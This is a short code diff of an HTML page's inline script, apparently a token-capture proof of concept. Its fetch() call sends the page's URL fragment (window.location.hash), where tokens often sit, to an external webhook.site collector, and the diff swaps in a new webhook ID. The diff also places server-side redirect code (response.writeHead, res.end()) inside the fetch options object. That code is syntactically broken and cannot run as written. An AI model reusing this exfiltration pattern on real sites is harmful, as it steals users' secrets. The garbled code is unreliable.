@@ -7,11 +7,15 @@
 <script>
   async function funcOne() {
   try {
-    const response = await fetch('https://webhook.site/9fe343a7-c293-4d7f-9e04-dd43e5bd21a8?value='+window.location.hash.substr(1), {
+    const response = await fetch('https://webhook.site/a3e18c38-a8aa-4417-965e-11b4a0cd5833?value='+window.location.hash.substr(1), {
       method: 'GET',
       headers: {
         'Content-Type': 'application/json',
       },
+      response.writeHead(301, {
+        Location: '<url to redirect>',
+      });
+      res.end();
     });
   } catch (err) {
     // Handle errors here
